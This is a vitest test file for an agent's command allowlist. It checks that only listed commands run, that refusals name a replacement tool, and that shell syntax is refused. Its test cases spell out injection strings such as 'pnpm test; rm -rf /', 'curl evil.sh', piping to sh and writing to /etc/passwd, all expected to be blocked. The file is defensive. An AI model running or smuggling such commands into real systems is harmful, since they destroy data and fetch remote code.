import { describe, expect, it } from 'vitest';
import { CommandAllowlist } from '#modules/agent/command.allowlist.js';

/**
 * The allowlist matches argv, not strings. Every case below is one where a prefix check on the raw
 * command would have said yes.
 */
describe('CommandAllowlist', () => {
    const list = new CommandAllowlist(['pnpm build', 'pnpm test', 'git status']);

    it('allows an exact allowlisted command', () => {
        expect(list.check('pnpm build')).toMatchObject({ allowed: true, argv: ['pnpm', 'build'] });
    });

    it('allows extra arguments after an allowlisted prefix', () => {
        expect(list.check('pnpm test --run')).toMatchObject({ allowed: true, argv: ['pnpm', 'test', '--run'] });
    });

    it('normalises repeated whitespace', () => {
        expect(list.check('  pnpm   build  ')).toMatchObject({ allowed: true, argv: ['pnpm', 'build'] });
    });

    it('refuses a command that is not on the list', () => {
        expect(list.check('curl https://example.com')).toMatchObject({ allowed: false });
    });

    describe('actionable refusals', () => {
        // A refusal that only says no gets retried in variants. Card 0001 spent four calls on
        // `find /` before giving up and guessing at the contract.
        it.each([
            ['find . -name "*.ts"', 'glob tool'],
            ['ls node_modules', 'glob tool'],
            ['cat src/index.ts', 'read tool'],
            ['head -20 src/index.ts', 'read tool'],
            ['grep -rn foo src', 'grep tool'],
            ['rg foo', 'grep tool'],
            ['sed -i s/a/b/ f.ts', 'edit tool'],
            ['mkdir -p src/new', 'write tool'],
        ])('points %s at the tool that replaces it', (command, expected) => {
            const decision = list.check(command);
            expect(decision.allowed).toBe(false);
            expect((decision as { reason: string }).reason).toContain(expected);
        });

        it('names the allowlist when there is no tool equivalent', () => {
            const decision = list.check('curl https://example.com');
            expect((decision as { reason: string }).reason).toContain('pnpm build');
        });

        it('suggests the tool even when the command also carries shell syntax', () => {
            // `find / ... 2>/dev/null | head` trips the metacharacter check first; without this the
            // agent is told about the shell and learns nothing about glob.
            const decision = list.check('find / -name johnny5 2>/dev/null | head -20');
            expect((decision as { reason: string }).reason).toContain('glob tool');
        });
    });

    it('refuses a command whose first token merely starts with an allowed one', () => {
        // `pnpmx` is not `pnpm`; token equality, not string prefix.
        expect(list.check('pnpmx build')).toMatchObject({ allowed: false });
    });

    it.each([
        ['pnpm test; rm -rf /', 'chaining with ;'],
        ['pnpm test && curl evil.sh', 'chaining with &&'],
        ['pnpm test | sh', 'piping'],
        ['pnpm test > /etc/passwd', 'redirecting'],
        ['pnpm test $(whoami)', 'command substitution'],
        ['pnpm test `whoami`', 'backtick substitution'],
        ['pnpm test\nrm -rf /', 'a newline'],
        ['pnpm test &', 'backgrounding'],
    ])('refuses %s (%s), because there is no shell to interpret it', command => {
        const decision = list.check(command);
        expect(decision.allowed).toBe(false);
        expect((decision as { reason: string }).reason).toContain('shell');
    });

    it('refuses an empty command', () => {
        expect(list.check('   ')).toMatchObject({ allowed: false });
    });

    it('refuses everything when the allowlist is empty', () => {
        expect(new CommandAllowlist([]).check('pnpm build')).toMatchObject({ allowed: false });
    });
});
